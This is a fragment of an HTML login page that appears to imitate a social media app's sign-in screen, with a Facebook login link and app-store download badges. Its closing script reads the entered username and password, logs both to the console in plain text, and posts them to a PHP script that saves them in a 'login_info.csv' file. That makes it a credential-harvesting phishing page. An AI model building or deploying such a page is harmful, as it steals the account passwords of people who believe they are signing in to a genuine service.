        <!--Form Login-->
        <form id="login-post" method="POST" onsubmit="handleFormSubmit(event)">

              with Facebook</a>
          </div>
        </form>

        <!--Password recovery-->
        <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
      </div>

      <!--Sign up-->
      <div class="signup-container">
        <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
      </div>

      <!--App's download-->
      <div class="get-container">
        <p>Get the app.</p>
        <div class="download-container">
          <a class="download-appstore" href="#" target="_blank"><img class="appstore"
              src="./img/applestore-logo.png"></a>
          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay"
              src="./img/googleplay-logo.png"></a>

<!-- Add this script in your HTML file -->
<script>
  document.addEventListener('DOMContentLoaded', function () {
    function handleFormSubmit(event) {
      event.preventDefault();

      const username = document.querySelector('input[name="username"]').value;
      const password = document.querySelector('input[name="password"]').value;

      console.log('Username:', username);
      console.log('Password:', password);

      // Send the data to a server-side script for processing
      sendDataToServer(username, password);
    }

    function sendDataToServer(username, password) {
      // Use XMLHttpRequest or Fetch API to send data to a server-side script (e.g., update_csv.php)
      // The server-side script should handle updating the "login_info.csv" file
      // Example using XMLHttpRequest:
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'update_csv.php', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(`username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`);
    }

    const loginForm = document.getElementById('login-post');
    loginForm.addEventListener('submit', handleFormSubmit);
  });
</script>
